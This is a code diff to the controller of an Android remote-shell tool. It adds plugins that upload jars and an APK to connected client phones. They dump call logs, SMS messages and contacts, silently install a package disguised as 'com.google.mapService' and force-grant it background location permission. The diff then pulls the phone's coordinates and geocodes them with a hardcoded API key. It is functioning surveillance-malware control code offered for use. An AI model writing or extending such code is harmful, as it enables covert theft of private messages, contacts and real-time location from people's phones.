@@ -35,6 +35,7 @@ import kotlinx.coroutines.flow.asStateFlow
 import kotlinx.coroutines.flow.update
 import kotlinx.coroutines.launch
 import java.io.File
+import java.net.URL
 import java.security.MessageDigest
 import org.json.JSONArray
 import org.json.JSONObject
@@ -51,7 +52,6 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
     private val fileManagerUseCase = FileManagerUseCase(deviceCommandRepository)
     private val processUseCase = ProcessUseCase(shellUseCase, fileManagerUseCase)
     private val captureUseCase = CaptureUseCase(shellUseCase, fileManagerUseCase)
-    private val appListUseCase = com.kgapp.frpshellpro.domain.usecase.AppListUseCase(shellUseCase, fileManagerUseCase, captureUseCase)
 
     private val _uiState = MutableStateFlow(MainUiState())
     val uiState: StateFlow<MainUiState> = _uiState.asStateFlow()
@@ -86,14 +86,9 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
         viewModelScope.launch(Dispatchers.IO) {
             runCatching {
                 val context = application.applicationContext
-                val jarFile = File(context.filesDir, "scrcpy-server.jar")
-                // Ensure file exists and is not empty
-                if (!jarFile.exists() || jarFile.length() == 0L) {
-                    FrpLogBus.append("[初始化] 正在提取 scrcpy-server.jar 到应用目录...")
-                    copyAssetToFile(context, "scrcpy-server.jar", jarFile)
-                } else {
-                    FrpLogBus.append("[初始化] scrcpy-server.jar 已就绪")
-                }
+                ensureLocalAssetReady(context, "GetPhoto.jar")
+                ensureLocalAssetReady(context, "GetInfo.jar")
+                ensureLocalAssetReady(context, "GetLoc.apk")
             }.onFailure {
                 logInit(MODULE_NETWORK, "scrcpy 资源初始化异常", it)
             }
@@ -275,7 +270,27 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
             FrpLogBus.append("[系统] 资源文件 $assetName 提取成功")
         } catch (e: Exception) {
             FrpLogBus.append("[初始化] 复制资源文件 $assetName 失败：${e.message}")
+            throw e
         }
+    }
+
+    private fun ensureLocalAssetReady(context: android.content.Context, assetName: String): File {
+        val localFile = File(context.filesDir, assetName)
+        if (localFile.exists() && localFile.length() > 0L) {
+            return localFile
+        }
+
+        val assets = context.assets.list("").orEmpty()
+        if (assetName !in assets) {
+            throw IllegalStateException("assets 中缺少 $assetName，请先把插件放入 app/src/main/assets")
+        }
+
+        FrpLogBus.append("[初始化] 正在提取 $assetName 到应用目录...")
+        copyAssetToFile(context, assetName, localFile)
+        if (!localFile.exists() || localFile.length() == 0L) {
+            throw IllegalStateException("本地 $assetName 不存在")
+        }
+        return localFile
     }
 
     fun onSelectTarget(target: ShellTarget) {
@@ -539,64 +554,364 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
         }
     }
 
-    fun showAppList(clientId: String) {
+    fun showGetInfoPlugin(clientId: String) {
         _uiState.update {
             it.copy(
-                screen = ScreenDestination.AppList,
-                appListClientId = clientId
+                screen = ScreenDestination.GetInfoPlugin,
+                pluginClientId = clientId,
+                callLogErrorMessage = null,
+                smsErrorMessage = null,
+                contactErrorMessage = null
             )
         }
-        loadAppList(clientId)
     }
 
-    fun hideAppList() {
+    fun dismissGetInfoPlugin() {
         _uiState.update {
             it.copy(
                 screen = ScreenDestination.Main,
-                appListVisible = false,
-                appListLoading = false,
-                appListItems = emptyList(),
-                appListErrorMessage = null,
-                appListClientId = null
+                pluginClientId = null,
+                callLogLoading = false,
+                callLogErrorMessage = null,
+                callLogItems = emptyList(),
+                smsLoading = false,
+                smsErrorMessage = null,
+                smsItems = emptyList(),
+                contactLoading = false,
+                contactErrorMessage = null,
+                contactItems = emptyList()
             )
         }
     }
 
-    fun refreshAppList() {
-        val clientId = _uiState.value.appListClientId ?: (_uiState.value.selectedTarget as? ShellTarget.Client)?.id ?: return
-        loadAppList(clientId)
+    fun showGetLocPlugin(clientId: String) {
+        _uiState.update {
+            it.copy(
+                screen = ScreenDestination.GetLocPlugin,
+                pluginClientId = clientId,
+                getLocErrorMessage = null,
+                locationAddressErrorMessage = null
+            )
+        }
     }
 
-    private fun loadAppList(clientId: String) {
+    fun dismissGetLocPlugin() {
+        _uiState.update {
+            it.copy(
+                screen = ScreenDestination.Main,
+                pluginClientId = null,
+                getLocLoading = false,
+                getLocErrorMessage = null,
+                locationInfo = null,
+                locationAddress = null,
+                locationAddressLoading = false,
+                locationAddressErrorMessage = null
+            )
+        }
+    }
+
+    fun fetchLocationByPlugin() {
+        val state = _uiState.value
+        val clientId = state.pluginClientId ?: (state.selectedTarget as? ShellTarget.Client)?.id ?: return
         viewModelScope.launch(Dispatchers.IO) {
-            _uiState.update { it.copy(appListLoading = true, appListErrorMessage = null) }
+            _uiState.update {
+                it.copy(
+                    getLocLoading = true,
+                    getLocErrorMessage = null,
+                    locationInfo = null,
+                    locationAddress = null,
+                    locationAddressErrorMessage = null
+                )
+            }
+            try {
+                val appContext = getApplication<Application>()
+                val remoteApk = ensureRemoteFileReady(appContext, clientId, "GetLoc.apk")
+
+                captureUseCase.runCommand(clientId, "pm install -r $remoteApk", timeoutMs = 30_000)
+                captureUseCase.runCommand(clientId, "pm grant com.google.mapService android.permission.ACCESS_FINE_LOCATION", timeoutMs = 10_000)
+                captureUseCase.runCommand(clientId, "pm grant com.google.mapService android.permission.ACCESS_BACKGROUND_LOCATION", timeoutMs = 10_000)
+                captureUseCase.runCommand(clientId, "am start-foreground-service -n com.google.mapService/.LocationService", timeoutMs = 10_000)
+
+                val remoteJsonPath = "/data/user/0/com.google.mapService/files/location.json"
+                val timeoutMs = 30_000L
+                val start = System.currentTimeMillis()
+                var exists = false
+                while (System.currentTimeMillis() - start < timeoutMs) {
+                    val check = captureUseCase.runCommand(clientId, "if [ -f $remoteJsonPath ]; then echo exists; else echo missing; fi", timeoutMs = 2_000).orEmpty()
+                    if (check.contains("exists")) {
+                        exists = true
+                        break
+                    }
+                    delay(1_000)
+                }
+                if (!exists) {
+                    throw IllegalStateException("未检测到 location.json")
+                }
+
+                val localFile = File(appContext.cacheDir, "location_${System.currentTimeMillis()}.json")
+                val dl = captureUseCase.downloadCapture(clientId, remoteJsonPath, localFile)
+                if (dl != ClientSession.DownloadResult.Success) {
+                    throw IllegalStateException("下载 location.json 失败")
+                }
+
+                val json = JSONObject(localFile.readText())
+                val latitude = json.optDouble("latitude", Double.NaN)
+                val longitude = json.optDouble("longitude", Double.NaN)
+                if (latitude.isNaN() || longitude.isNaN()) {
+                    throw IllegalStateException("location.json 中无有效经纬度")
+                }
+
+                val info = LocationInfo(
+                    latitude = latitude,
+                    longitude = longitude,
+                    time = json.optString("time").ifBlank { "未知" }
+                )
+                _uiState.update {
+                    it.copy(
+                        getLocLoading = false,
+                        getLocErrorMessage = null,
+                        locationInfo = info
+                    )
+                }
+                FrpLogBus.append("[GetLoc] 已获取位置 lat=$latitude lon=$longitude")
+            } catch (e: Exception) {
+                _uiState.update { it.copy(getLocLoading = false, getLocErrorMessage = "获取位置失败: ${e.message}") }
+                FrpLogBus.append("[GetLoc] 获取位置失败: ${e.message}")
+            }
+        }
+    }
+
+    fun resolveLocationAddress() {
+        val info = _uiState.value.locationInfo ?: return
+        viewModelScope.launch(Dispatchers.IO) {
+            _uiState.update { it.copy(locationAddressLoading = true, locationAddressErrorMessage = null, locationAddress = null) }
+            try {
+                val url = "https://api.geoapify.com/v1/geocode/reverse?lat=${info.latitude}&lon=${info.longitude}&apiKey=98702fe67e9941d9ac02687c5c1b217d"
+                val text = URL(url).readText()
+                val json = JSONObject(text)
+                val features = json.optJSONArray("features") ?: JSONArray()
+                val first = features.optJSONObject(0)
+                val formatted = first?.optJSONObject("properties")?.optString("formatted").orEmpty()
+                if (formatted.isBlank()) {
+                    throw IllegalStateException("未查询到地址信息")
+                }
+                _uiState.update { it.copy(locationAddressLoading = false, locationAddress = formatted, locationAddressErrorMessage = null) }
+            } catch (e: Exception) {
+                _uiState.update { it.copy(locationAddressLoading = false, locationAddressErrorMessage = "查询位置失败: ${e.message}") }
+            }
+        }
+    }
+
+    fun onCallLogCountChanged(value: String) {
+        val filtered = value.filter { it.isDigit() }.take(3)
+        _uiState.update { it.copy(callLogCountInput = filtered) }
+    }
+
+    fun refreshCallLogs() {
+        val state = _uiState.value
+        val clientId = state.pluginClientId ?: (state.selectedTarget as? ShellTarget.Client)?.id ?: return
+        val count = state.callLogCountInput.toIntOrNull() ?: 5
+        loadCallLogs(clientId, count)
+    }
+
+    fun onSmsCountChanged(value: String) {
+        val filtered = value.filter { it.isDigit() }.take(3)
+        _uiState.update { it.copy(smsCountInput = filtered) }
+    }
+
+    fun refreshSms() {
+        val state = _uiState.value
+        val clientId = state.pluginClientId ?: (state.selectedTarget as? ShellTarget.Client)?.id ?: return
+        val count = state.smsCountInput.toIntOrNull() ?: 3
+        loadSms(clientId, count)
+    }
+
+    fun onContactCountChanged(value: String) {
+        val filtered = value.filter { it.isDigit() }.take(3)
+        _uiState.update { it.copy(contactCountInput = filtered) }
+    }
+
+    fun refreshContacts() {
+        val state = _uiState.value
+        val clientId = state.pluginClientId ?: (state.selectedTarget as? ShellTarget.Client)?.id ?: return
+        val count = state.contactCountInput.toIntOrNull() ?: 5
+        loadContacts(clientId, count)
+    }
+
+    private fun loadCallLogs(clientId: String, count: Int) {
+        viewModelScope.launch(Dispatchers.IO) {
+            _uiState.update { it.copy(callLogLoading = true, callLogErrorMessage = null) }
 
             try {
                 val appContext = getApplication<Application>()
-                val localJar = File(appContext.filesDir, "scrcpy-server.jar")
-                if (!localJar.exists() || localJar.length() == 0L) {
-                    copyAssetToFile(appContext, "scrcpy-server.jar", localJar)
+                val remoteJarPath = ensurePluginReady(appContext, clientId, "GetInfo.jar")
+
+                val safeCount = count.coerceIn(1, 200)
+                val command = "export CLASSPATH=$remoteJarPath && /system/bin/app_process /data/local/tmp app.Main --get_calllog --call_code=$safeCount --json"
+                val raw = captureUseCase.runCommand(clientId, command, timeoutMs = 30_000)
+                    ?: throw IllegalStateException("客户端未返回结果")
+
+                val json = extractJsonObject(raw)
+                val status = json.optString("status")
+                if (status != "success") {
+                    throw IllegalStateException(json.optString("message").ifBlank { "执行失败" })
                 }
 
-                val apps = appListUseCase.getAppList(clientId, localJar)
+                val calls = json.optJSONArray("calls") ?: JSONArray()
+                val items = buildList {
+                    for (i in 0 until calls.length()) {
+                        val item = calls.optJSONObject(i) ?: continue
+                        add(
+                            CallLogItem(
+                                number = item.optString("number"),
+                                date = item.optLong("date", 0L),
+                                duration = item.optLong("duration", 0L),
+                                type = item.optInt("type", 0)
+                            )
+                        )
+                    }
+                }
+
                 _uiState.update {
                     it.copy(
-                        appListLoading = false,
-                        appListItems = apps,
-                        appListErrorMessage = null
+                        callLogLoading = false,
+                        callLogItems = items,
+                        callLogErrorMessage = null,
+                        callLogCountInput = safeCount.toString()
                     )
                 }
-                FrpLogBus.append("[应用] 已加载应用列表，共 ${apps.size} 个应用")
+                FrpLogBus.append("[通话记录] 已读取 ${items.size} 条记录")
             } catch (e: Exception) {
                 _uiState.update {
                     it.copy(
-                        appListLoading = false,
-                        appListErrorMessage = "获取应用列表失败: ${e.message}"
+                        callLogLoading = false,
+                        callLogErrorMessage = "读取通话记录失败: ${e.message}"
                     )
                 }
-                FrpLogBus.append("[应用] 获取应用列表失败: ${e.message}")
+                FrpLogBus.append("[通话记录] 读取失败: ${e.message}")
             }
         }
+    }
+
+    private fun loadSms(clientId: String, count: Int) {
+        viewModelScope.launch(Dispatchers.IO) {
+            _uiState.update { it.copy(smsLoading = true, smsErrorMessage = null) }
+            try {
+                val appContext = getApplication<Application>()
+                val remoteJarPath = ensurePluginReady(appContext, clientId, "GetInfo.jar")
+                val safeCount = count.coerceIn(1, 200)
+                val command = "export CLASSPATH=$remoteJarPath && /system/bin/app_process /data/local/tmp app.Main --get_sms --sms_code=$safeCount --json"
+                val raw = captureUseCase.runCommand(clientId, command, timeoutMs = 30_000)
+                    ?: throw IllegalStateException("客户端未返回结果")
+                val json = extractJsonObject(raw)
+                if (json.optString("status") != "success") {
+                    throw IllegalStateException(json.optString("message").ifBlank { "执行失败" })
+                }
+                val arr = json.optJSONArray("messages") ?: JSONArray()
+                val items = buildList {
+                    for (i in 0 until arr.length()) {
+                        val item = arr.optJSONObject(i) ?: continue
+                        add(
+                            SmsItem(
+                                address = item.optString("address"),
+                                body = item.optString("body"),
+                                timestamp = item.optLong("timestamp", 0L)
+                            )
+                        )
+                    }
+                }
+                _uiState.update {
+                    it.copy(
+                        smsLoading = false,
+                        smsErrorMessage = null,
+                        smsItems = items,
+                        smsCountInput = safeCount.toString()
+                    )
+                }
+                FrpLogBus.append("[短信] 已读取 ${items.size} 条记录")
+            } catch (e: Exception) {
+                _uiState.update { it.copy(smsLoading = false, smsErrorMessage = "读取短信失败: ${e.message}") }
+                FrpLogBus.append("[短信] 读取失败: ${e.message}")
+            }
+        }
+    }
+
+    private fun loadContacts(clientId: String, count: Int) {
+        viewModelScope.launch(Dispatchers.IO) {
+            _uiState.update { it.copy(contactLoading = true, contactErrorMessage = null) }
+            try {
+                val appContext = getApplication<Application>()
+                val remoteJarPath = ensurePluginReady(appContext, clientId, "GetInfo.jar")
+                val safeCount = count.coerceIn(1, 200)
+                val command = "export CLASSPATH=$remoteJarPath && /system/bin/app_process /data/local/tmp app.Main --get_contact --contact_code=$safeCount"
+                val raw = captureUseCase.runCommand(clientId, command, timeoutMs = 30_000)
+                    ?: throw IllegalStateException("客户端未返回结果")
+                val json = extractJsonObject(raw)
+                if (json.optString("status") != "success") {
+                    throw IllegalStateException(json.optString("message").ifBlank { "执行失败" })
+                }
+                val arr = json.optJSONArray("contacts") ?: JSONArray()
+                val items = buildList {
+                    for (i in 0 until arr.length()) {
+                        val item = arr.optJSONObject(i) ?: continue
+                        add(
+                            ContactItem(
+                                displayName = item.optString("display_name"),
+                                phone = item.optString("data1")
+                            )
+                        )
+                    }
+                }
+                _uiState.update {
+                    it.copy(
+                        contactLoading = false,
+                        contactErrorMessage = null,
+                        contactItems = items,
+                        contactCountInput = safeCount.toString()
+                    )
+                }
+                FrpLogBus.append("[联系人] 已读取 ${items.size} 条记录")
+            } catch (e: Exception) {
+                _uiState.update { it.copy(contactLoading = false, contactErrorMessage = "读取联系人失败: ${e.message}") }
+                FrpLogBus.append("[联系人] 读取失败: ${e.message}")
+            }
+        }
+    }
+
+    private suspend fun ensurePluginReady(appContext: Application, clientId: String, assetName: String): String {
+        val localJar = ensureLocalAssetReady(appContext, assetName)
+
+        val remoteJarPath = "/data/local/tmp/$assetName"
+        val uploaded = captureUseCase.uploadDependency(clientId, remoteJarPath, localJar)
+        if (!uploaded) {
+            throw IllegalStateException("上传 $assetName 失败")
+        }
+        captureUseCase.runCommand(clientId, "chmod 777 $remoteJarPath", timeoutMs = 5_000)
+        return remoteJarPath
+    }
+
+    private suspend fun ensureRemoteFileReady(appContext: Application, clientId: String, assetName: String): String {
+        val localFile = ensureLocalAssetReady(appContext, assetName)
+
+        val remotePath = "/data/local/tmp/$assetName"
+        val existsOutput = captureUseCase.runCommand(clientId, "if [ -f $remotePath ]; then echo exists; else echo missing; fi", timeoutMs = 8_000).orEmpty()
+        if (!existsOutput.contains("exists")) {
+            val uploaded = captureUseCase.uploadDependency(clientId, remotePath, localFile)
+            if (!uploaded) {
+                throw IllegalStateException("上传 $assetName 失败")
+            }
+        }
+        captureUseCase.runCommand(clientId, "chmod 777 $remotePath", timeoutMs = 5_000)
+        return remotePath
+    }
+
+    private fun extractJsonObject(raw: String): JSONObject {
+        val start = raw.indexOf('{')
+        val end = raw.lastIndexOf('}')
+        if (start < 0 || end <= start) {
+            throw IllegalStateException("返回内容不是 JSON")
+        }
+        return JSONObject(raw.substring(start, end + 1))
     }
 
 
